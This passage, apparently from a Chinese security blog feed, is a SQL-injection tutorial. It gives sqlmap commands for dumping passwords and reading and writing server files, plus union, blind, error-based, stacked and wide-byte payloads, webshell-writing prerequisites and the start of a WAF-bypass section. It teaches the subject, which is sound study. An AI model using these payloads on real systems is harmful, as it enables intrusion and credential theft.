<p>20.&#x2F;sqlmap.py -u “<a href="http://192.168.1.1/4.php?id=1">http://192.168.1.1/4.php?id=1</a>“ –common-tables -D testdb –banner </p>
<p>21.&#x2F;sqlmap.py -u “<a href="http://192.168.1.1/4.php?id=1">http://192.168.1.1/4.php?id=1</a>“ –cookie&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low” –string&#x3D;’xx’ –dbs –level&#x3D;3 -p “uid”</p>
<h2 id="简单的注入流程"><a href="#简单的注入流程" class="headerlink" title="简单的注入流程 :"></a>简单的注入流程 :</h2><p>1.读取数据库版本，当前用户，当前数据库 </p>
<p>sqlmap -u <a href="http://localhost:88/sqli-labs-master/Less-1/?id=1">http://localhost:88/sqli-labs-master/Less-1/?id=1</a> -f -b –current-user –current-db -v 1 </p>
<p>2.判断当前数据库用户权限 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1 </p>
<p>3.读取所有数据库用户或指定数据库用户的密码 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2 </p>
<p>4.获取所有数据库 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2 </p>
<p>5.获取指定数据库中的所有表 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2 </p>
<p>6.获取指定数据库名中指定表的字段 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2 </p>
<p>7.获取指定数据库名中指定表中指定字段的数据 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D &lt;数据库&gt; -T &lt;表&gt; -C “&lt;列&gt;” -s “sqlnmapdb.log” -v 2 </p>
<p>8.file-read读取web文件 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-read “&lt;目标文件路径&gt;” -v 2 </p>
<p>9.file-write写入文件到web </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-write &lt;本地路劲&gt; –file-dest “&lt;目标路径&gt;”</p>
]]></content>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2023/04/10/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h2><p>在动态网站中，往往需要用户传递参数到服务器，这些参数往往需要和数据库进行交互；当服务端没有对参数进行安全过滤时，攻击者在参数中加入恶意的sql语句结构，便编造成了sql注入漏洞，总结成一句就是：可控变量、代入数据库查询、变量未存在过滤或者过滤不严谨。</p>
<h2 id="二、危害"><a href="#二、危害" class="headerlink" title="二、危害"></a>二、危害</h2><p>数据库信息泄露</p>
<p>网站权限被利用</p>
<p>服务端被远程控制，被安装后门</p>
<p>操作文件系统</p>
<h2 id="三、修复"><a href="#三、修复" class="headerlink" title="三、修复"></a>三、修复</h2><p>1、sql语句预编译</p>
<p>采用PreparedStatement，将sql语句预先编译好，sql引擎会预先进行语法分析，产生语法树，生成执行计划，后面输入的参数，无论输入什么，都不会影响sql语句的语法结构，所以即使在后面拼接sql语句，也不会被当成sql命令来执行，因为sql命令的执行， 必须先通过语法分析，来生成执行计划，而语法分析在之前就已经完成，已经预编译过了，后面输入的参数是不会作为sql命令来执行的，只会被当做字符串，让攻击者无缝可钻！┑(￣▽ ￣)┍</p>
<p>2、对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>
<p>3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>
<p>4、长度限制，能在一定程度上防止比较长的 sql 注入语句无法正确执行。</p>
<p>5、网站每个数据层的编码统一，建议全部使用 utf-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
<p>6、严格限制网站用户的数据库的操作权限，仅满足其工作权限，最大限度减少注入数据对数据库造成危害。</p>
<p>7、不显示显示 sql 错误信息，例如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行判断。</p>
<h2 id="四、注入分类"><a href="#四、注入分类" class="headerlink" title="四、注入分类"></a>四、注入分类</h2><p>0x00 联合注入</p>
<p>0x01 http-header注入</p>
<p>0x02 报错注入</p>
<p>0x03 布尔型盲注</p>
<p>0x04 延时注入</p>
<p>0x05 宽字节注入</p>
<p>0x06 堆叠注入</p>
<p>0x08 偏移注入</p>
<h2 id="五、注入类型"><a href="#五、注入类型" class="headerlink" title="五、注入类型"></a>五、注入类型</h2><p>在sql注入漏洞中，注入类型分为三种：数字型、字符型、搜索型   </p>
<h3 id="（1）数字型"><a href="#（1）数字型" class="headerlink" title="（1）数字型"></a>（1）数字型</h3><p>在 Web 端中经常能看到是例如<code>http://xxx.com/news.php?id=1</code> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 sql 语句结构通常为 <code>select * from news where id=1</code>，如果攻击者将参数id的值改为<code>1 or 1=1</code>，那么程序中拼接的sql语句则为：<code>select * from news where id=1 or 1=1</code>，因此参数改变了原有的sql语句结构，导致了sql注入漏洞攻击。</p>
<h3 id="（2）字符型"><a href="#（2）字符型" class="headerlink" title="（2）字符型"></a>（2）字符型</h3><p>在 Web 端中也经常能看到例如<code>http://xxx.com/news.php?name=admin</code> 这种形式的URL地址，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 sql 语句结构通常为 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>当攻击者在参数值<code>admin</code>尾部加入攻击代码<code>&#39; or 1=1</code>,那么拼接出来的sql注入语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from news where chr=&#x27;admin&#x27; or 1=1 </span><br></pre></td></tr></table></figure>

<p>这样sql语句同样也会被改变，当然攻击者也不仅仅使用这么简单的攻击代码，通常还会使用一些更加复杂的攻击代码，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1 </span><br></pre></td></tr></table></figure>

<p>在程序中拼接sql语句之后，则变成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from news where chr=&#x27;admin&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1&#x27; </span><br></pre></td></tr></table></figure>

<h3 id="（3）搜索型"><a href="#（3）搜索型" class="headerlink" title="（3）搜索型"></a>（3）搜索型</h3><p>很多时候我们会看到网站有个站内搜索的功能，搜索功能往往需要和数据库进行交互，因此也会存在sql注入漏洞风险，搜索型sql注入的特点是攻击代码中有两个<code>%</code> ,如下图所示</p>
<p><img src="D:\Downloads\Typicture\7000.png" alt="img"></p>
<p>在上图中可以看到，这个地方原本是用来搜索相关用户名的，当攻击代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%xxxx% or 1=1 #%&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="六、常用函数与参数"><a href="#六、常用函数与参数" class="headerlink" title="六、常用函数与参数"></a>六、常用函数与参数</h2><h3 id="MySQL数据库常用函数与参数"><a href="#MySQL数据库常用函数与参数" class="headerlink" title="MySQL数据库常用函数与参数"></a>MySQL数据库常用函数与参数</h3><table>
<thead>
<tr>
<th align="left">&#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D; 、&lt;&gt;</th>
<th>比较运算符</th>
</tr>
</thead>
<tbody><tr>
<td align="left">and、or</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td align="left">version( )&#x2F;@@version</td>
<td>mysql数据库版本</td>
</tr>
<tr>
<td align="left">database( )</td>
<td>当前数据库名</td>
</tr>
<tr>
<td align="left">sleep( )</td>
<td>睡眠时间为指定的秒数</td>
</tr>
<tr>
<td align="left">if(true,t,f)</td>
<td>if判断</td>
</tr>
<tr>
<td align="left">length( )</td>
<td>返回字符串的长度</td>
</tr>
<tr>
<td align="left">substring( )</td>
<td>截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</td>
</tr>
<tr>
<td align="left">substr( )</td>
<td></td>
</tr>
<tr>
<td align="left">mid( )</td>
<td></td>
</tr>
<tr>
<td align="left">left( )</td>
<td>从左侧开始取指定字符个数的字符串</td>
</tr>
<tr>
<td align="left">right()</td>
<td>从右侧开始取指定字符个数的字符串</td>
</tr>
<tr>
<td align="left">concat( )</td>
<td>没有分隔符的连接字符串</td>
</tr>
<tr>
<td align="left">concat_ws ( )</td>
<td>含有分割符的连接字符串</td>
</tr>
<tr>
<td align="left">group_conat( )</td>
<td>连接一个组的字符串</td>
</tr>
<tr>
<td align="left">ord( )</td>
<td>返回ASCII码</td>
</tr>
<tr>
<td align="left">ascii( )</td>
<td>返回ASCII码</td>
</tr>
<tr>
<td align="left">hex( )</td>
<td>将字符串转换为十六进制</td>
</tr>
<tr>
<td align="left">unhex( )</td>
<td>hex的反向操作</td>
</tr>
<tr>
<td align="left">md5( )</td>
<td>返回MD5值</td>
</tr>
<tr>
<td align="left">floor(x)</td>
<td>返回不大于x的最大整数</td>
</tr>
<tr>
<td align="left">round ( )</td>
<td>返回参数x接近的整数</td>
</tr>
<tr>
<td align="left">rand( )</td>
<td>返回0-1之间的随机浮点数</td>
</tr>
<tr>
<td align="left">exp(n)</td>
<td>返回e的n次方</td>
</tr>
<tr>
<td align="left">updatexml(XML_document, XPath_string, new_value)</td>
<td>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br/>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法<br/>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br/></td>
</tr>
<tr>
<td align="left">extractvalue(XML_document, XPath_string)</td>
<td>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br/>第二个参数：XPath_string (Xpath格式的字符串).</td>
</tr>
<tr>
<td align="left">load_file( )</td>
<td>读取文件，并返回文件内容作为一个字符串</td>
</tr>
<tr>
<td align="left">into outfile</td>
<td>函数into outfile 与 into dumpfile都是写文件</td>
</tr>
<tr>
<td align="left">find_in_set( )</td>
<td>返回字符串在字符串列表中的位置</td>
</tr>
<tr>
<td align="left">benchmark( )</td>
<td>指定语句执行的次数</td>
</tr>
<tr>
<td align="left">name_const ( )</td>
<td>返回表作为结果</td>
</tr>
<tr>
<td align="left">user( )</td>
<td>用户名</td>
</tr>
<tr>
<td align="left">current_user( )</td>
<td>当前用户名</td>
</tr>
<tr>
<td align="left">system_user( )</td>
<td>系统用户名</td>
</tr>
<tr>
<td align="left">@@datadir</td>
<td>数据库路径</td>
</tr>
<tr>
<td align="left">@@version_compile_os</td>
<td>操作系统版本</td>
</tr>
</tbody></table>
<h2 id="七、测试注入点方法"><a href="#七、测试注入点方法" class="headerlink" title="七、测试注入点方法"></a>七、测试注入点方法</h2><p>判断某个链接是否存在sql注入，可以通过对其传入的可控参数进行简单的构造，通过服务端返回的内容来判断有无注入</p>
<p>如果在页面的url中存在某些参数，比如这个URL中就存在一个id参数：<a href="http://xxxxx.xxx/?id=1%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E6%94%B9%E5%8F%98id%E7%9A%84%E5%80%BC%EF%BC%8C%E5%B0%86id%E6%94%B9%E4%B8%BA%E5%85%B6%E5%AE%83%E5%80%BC%EF%BC%8C%E7%9C%8B%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%90%A6%E4%BC%9A%E5%8F%91%E7%94%9F%E5%8F%98%E5%8C%96%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%8F%98%E5%8C%96%E5%8F%AF%E4%BB%A5%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD%E8%BF%99%E4%B8%AA%E5%80%BC%E4%BC%9A%E8%A2%AB%E5%B8%A6%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E5%B0%86%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%BB%93%E6%9E%9C%E8%BF%94%E5%9B%9E%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%B8%AD%E3%80%82%E5%9C%A8%E5%8F%91%E7%8E%B0%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8sqlmap%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A3%80%E6%9F%A5%E6%88%96%E8%80%85%E5%88%A9%E7%94%A8%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E7%9A%84">http://xxxxx.xxx/?id=1，可以尝试改变id的值，将id改为其它值，看页面是否会发生变化，如果有变化可以初步判断这个值会被带入数据库，将查询的结果返回到页面中。在发现可控参数时，可以使用sqlmap自动化工具进行sql注入的检查或者利用，也可以使用其他的</a> SQL 注入工具（例如jSQL Injection，NoSQLMap，BBQSQL等），简单点的可以手工测试，利用单双引号、 and 1&#x3D;1 和 and 1&#x3D;2 判断其数据类型，如果不显示报错信息的，可以测试bool盲注测试，通过?id &#x3D; 1 and 1&#x3D;1和?id &#x3D; 1 and 1&#x3D;2判断页面以及数据包和返回码是否不同，或者延时注入测试and sleep(5)，判断是否延时。</p>
<h3 id="1、联合注入"><a href="#1、联合注入" class="headerlink" title="1、联合注入"></a>1、联合注入</h3><p>原理：</p>
<p>联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。前提：两个表的字段要数要相同，否则会出现报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入 1&#x27;and &#x27;1&#x27;=&#x27;1 和 1&#x27;and &#x27;1&#x27;=&#x27;2 页面返回不同信息时，基本可以确定存在sql注入漏洞</span><br></pre></td></tr></table></figure>

<p>  (1)判断字段数</p>
<p>使用 order by 语句确定当前表的字段数</p>
<p>输入order by 1 ，如果页面返回正常字段数不少于1，order by 2 不少于 2，以此类推，直到出现报错，正确的字段数是报错时的字段数减 1</p>
<p>（2）联合查询注入通过 information_schema 获取数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来库名</span><br><span class="line">		select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">		select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>

<p>（3）联合查询注入通过 information_schema 获取表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来字段名</span><br><span class="line">		select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">	group_concat 一次性全部显示</span><br><span class="line">		select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#x27;库名（十六进制）&#x27;</span><br><span class="line">			注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</span><br></pre></td></tr></table></figure>

<p>   (4)联合查询注入通过 information_schema 获取列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">imit 一个一个打印出来</span><br><span class="line">		select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;库名&#x27; and TABLE_NAME=&#x27;表名&#x27; limit 0,1</span><br><span class="line">		</span><br><span class="line">	group_concat 一次性全部显示</span><br><span class="line">		select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;库名&#x27; and TABLE_NAME=&#x27;表名&#x27;</span><br></pre></td></tr></table></figure>

<p> （5）联合查询注入通过 information_schema 获取列数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来</span><br><span class="line">		select username,passwd from &#x27;表名&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 把 一次性全部打印</span><br><span class="line">		select group_concat(concat(username,0x20,passwd)) from &#x27;表名&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="2、布尔注入"><a href="#2、布尔注入" class="headerlink" title="2、布尔注入"></a>2、布尔注入</h3><p>在页面不返回任何数据库内容时，不能使用联合查询将敏感信息显示在页面，但是可以通过构造 SQL 语句，获取数据。</p>
<p>布尔型盲注入用到得 SQL 语句 select if(1&#x3D;1,1,0)，if 函数在 mysql 里是判断，第一个参数是表达式，如果条件成立，会显示 1，否则显示 0，1&#x3D;1 表达式可以换成构造的 SQL 攻击语句。配合ascii码和字符串截取，依次判断返回的内容来取得想要的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(1=1,1,0)--+ 页面返回正常，这个语句就是 1&#x27;and 1，真 and 真 结果为真，1 是存在记录的,所以返回正确页面。</span><br><span class="line"></span><br><span class="line">1&#x27; and if(1=2,1,0)--+ 页面返回错误，这个语句就是 1&#x27;and 0 ，真 and 假结 果为假，返回错误页面。</span><br></pre></td></tr></table></figure>

<p>使用count()查询记录的个数，使用 length() 和 limit 查询某条记录的长度。使用 limit , substr(), ascii() 来查询某条记录的内容。limit 的作用是指定记录，substr()的作用是截取指定记录的一个字符，ascii()的作用是将截取的字符转换为ascii码，</p>
<p>根据注入执行结果的布尔值（true 或者 false，显示的页面不同,数据包长度，返回码等来判断测试的值是否正确，还可使用bp的爆破模块进行爆破，效率更高！</p>
<p>语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr((payload), 1, 1)))&gt;105 </span><br></pre></td></tr></table></figure>

<p>3、报错注入</p>
<p>数据库报错是指数据库在执行命令时时，遇到语法不对，会显示报错信息</p>
<p>（1）updatexml报错</p>
<p>语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1,(payload),1)</span><br><span class="line">updatexml(1,concat(0x7e,(payload),0x7e),1)</span><br><span class="line">0x7e表示~，结果在~中显示</span><br></pre></td></tr></table></figure>

<p>   (2)  extractvalue报错</p>
<p>  语法如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xtractvalue(1,concat(0x7e,(payload),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>（3）exp报错</p>
<p>语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp(~(select * from (SQL语句)a)) 数据溢出报错</span><br></pre></td></tr></table></figure>

<p>(4) floor报错</p>
<p>报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p>
<p>语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取总共多少数据库</span><br><span class="line">and (select 1 from(select count(*),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">列出数据库</span><br><span class="line">单个列出 :</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line"></span><br><span class="line">查询表和字段直接把联合注入的payload放进去就可以了</span><br><span class="line">and(select 1 from (select count(*),concat(concat((payload),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure>

<h3 id="4、时间注入（盲注）"><a href="#4、时间注入（盲注）" class="headerlink" title="4、时间注入（盲注）"></a>4、时间注入（盲注）</h3><p>时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧。</p>
<p>在 mysql 里函数 sleep() 是延时的意思，sleep(10)就是数据库延时 10 秒返回内容。判断注入可以使用’and sleep(10) 数据库延时 10 秒返回值网页响应时间至少要 10 秒根据这个原理来判断存在 SQL 时间注入。</p>
<p>mysql 延时注入用到的函数 sleep() 、if()、substring()</p>
<p>select if(2&gt;1,sleep(10),0) 2&gt;1 这个部分就是你注入要构造的 SQL 语句。</p>
<p>select if(length(database())&gt;1,sleep(5),0) 这个就是查询当前库大于 1 就会延时 5 秒执行。</p>
<p>语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br><span class="line">and if(length(database()) &gt; 5,sleep(5),1)</span><br><span class="line"></span><br><span class="line">获取数据库信息</span><br><span class="line">and if(ascii(substr(database(),1,1))=114,sleep(5),1)</span><br><span class="line"></span><br><span class="line">获取数据表信息</span><br><span class="line">and if(ord(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;110,sleep(5),1)</span><br><span class="line"></span><br><span class="line">获取表对应的列信息</span><br><span class="line">and if(ord(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27;),1,1)),sleep(5),1)</span><br></pre></td></tr></table></figure>

<p>除了sleep之外的时间延时注入，还有GET_LOCK(str,timeout)</p>
<p>第一个参数是字符串，第二个参数为超时时间（timeout）秒</p>
<p>语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select GET_LOCK(&#x27;b&#x27;,10)</span><br></pre></td></tr></table></figure>

<h3 id="4-1、时间盲注之dns注入"><a href="#4-1、时间盲注之dns注入" class="headerlink" title="4.1、时间盲注之dns注入"></a>4.1、时间盲注之dns注入</h3><p>需要一个dns域名服务器（或者使用DNSLog在线网站，需要在my.conf配置文件中加入secure_file_priv&#x3D; （空） （secure_file_priv为null 表示不允许导入导出 secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹 secure_file_priv没有设置时，则表示没有任何限制。）</p>
<p>这种注入方式的原理是通过数据库函数load_file()，通过函数发送请求，将sql语句查询的结果带到DNS服务器解析，通过日志记录可以看到sql语句查询信息。</p>
<h3 id="5、宽字节注入"><a href="#5、宽字节注入" class="headerlink" title="5、宽字节注入"></a>5、宽字节注入</h3><p>数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入，前提条件：要有宽字节注入漏洞，首先要满足数据库后端使用双&#x2F;多字节解析 SQL 语句，其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）</p>
<p>由于输入的’会被转义，也就是自动在’前面增加 \，宽字节注入时利用mysql的一个特性，当使用GBK编码的时候（set names ‘GBK’），会认为两个字符是一个汉字，所以在URL中输入%df’经过转移后变为了**%df%5c%27**，MySQL用GBK的编码时会将%df%2f翻译成一个繁体字，最后留下了’</p>
<p>GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为2字节</p>
<p>如果使用了类似于set names gbk这样得语句,此时mysql数据库就会将 Ascii 大于128(%df)得字符当作是汉字字符得一部分,从而能吃掉,引入单引号或者双引号</p>
<p>gpc 绕过过程</p>
<p>%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库 GBK)&#x3D;&#x3D;&#x3D;&gt;運’</p>
<h3 id="6、堆叠注入"><a href="#6、堆叠注入" class="headerlink" title="6、堆叠注入"></a>6、堆叠注入</h3><p>在SQL语句中，语句的结束都是以 ; 结尾，但是如果我们在 ; 后面再加上一条SQL语句，两条语句会一起执行。（只有某些特定的版本才能执行，版本&lt;&#x3D;5.0）</p>
<p>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;; insert into users(id,username,password) values(88,&#x27;aaa&#x27;,&#x27;bbb&#x27;)%23</span><br></pre></td></tr></table></figure>

<h3 id="7、偏移注入（accesss数据库）"><a href="#7、偏移注入（accesss数据库）" class="headerlink" title="7、偏移注入（accesss数据库）"></a>7、偏移注入（accesss数据库）</h3><p>access数据库与mysql不同，access数据库没有类似于mysql的information_schema这样的系统数据库，所以对于access的表名及其字段名我们只能靠经验进行猜解。在只能猜解出表名，而猜解不出所想要的字段名的情况下，直接爆最后的字段数据。</p>
<p>原理：</p>
<p>将目标表进行(多级)内连接，通过联合查询和已知目标字段名的微调，将我们想要知道的字段值在已经确定的显示位上暴露出来</p>
<h2 id="八、常用查询语法"><a href="#八、常用查询语法" class="headerlink" title="八、常用查询语法"></a>八、常用查询语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">列出(数据库：test)中所有的表</span><br><span class="line"> limit 一个一个打印出来字段名</span><br><span class="line">  select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"> group_concat 一次性全部显示</span><br><span class="line">  select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">列出（数据库：test 表：admin ）中所有的字段</span><br><span class="line"> limit 一个一个打印出来</span><br><span class="line">  select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br><span class="line">  </span><br><span class="line"> group_concat 一次性全部显示</span><br><span class="line">  select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">列出（数据库：test 表：admin ）中的数据</span><br><span class="line"> limit 一个一个打印出来</span><br><span class="line">  select username,passwd from test.admin limit 0,1</span><br><span class="line"></span><br><span class="line"> group_concat 把 一次性全部打印</span><br><span class="line">  select group_concat(concat(username,0x20,passwd)) from test.admin</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select (select (payload)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and exists(select * from information_schema.tables) --+</span><br><span class="line">?id=1&#x27; and (select length(version()))=6 --+   //判断version()返回字符串长度。</span><br><span class="line">?id=1&#x27; and (select count(table_schema) from information_schema.tables) &gt; 8 --+ </span><br><span class="line">//判断有多少数据库</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (select ascii(substr((select table_schema from information_schema.tables limit 0, 1), 1, 1)))&gt;105 --+ //判断第一个库的第一个字符</span><br><span class="line">判断库或者表的总体长度  SELECT LENGTH((payload)) &gt; 6</span><br></pre></td></tr></table></figure>

<h2 id="九、补充"><a href="#九、补充" class="headerlink" title="九、补充"></a>九、补充</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">想往数据库写入木马文件的先决条件</span><br><span class="line">1.root权限对文件有读写权限</span><br><span class="line">2.绝对路径</span><br><span class="line">3.可以union进行查询</span><br><span class="line">4.导入与导出权限的value值不为NULL</span><br><span class="line">5.全局未开启gpc功能</span><br><span class="line"></span><br><span class="line">防止SQL注入的函数:</span><br><span class="line">1.addslashes(字符型进行过滤）</span><br><span class="line">2.intval(针对整型进行过滤)</span><br><span class="line">3.PDO预处理方式</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sql注入WAF绕过</title>
    <url>/2023/04/12/sql%E6%B3%A8%E5%85%A5waf%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="SQL注入WAF绕过"><a href="#SQL注入WAF绕过" class="headerlink" title="SQL注入WAF绕过"></a>SQL注入WAF绕过</h1><h3 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1 大小写绕过"></a>1 大小写绕过</h3><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p>
<h3 id="2-替换关键字"><a href="#2-替换关键字" class="headerlink" title="2 替换关键字"></a>2 替换关键字</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h3 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3 空格绕过"></a>3 空格绕过</h3><p><strong>payload</strong></p>
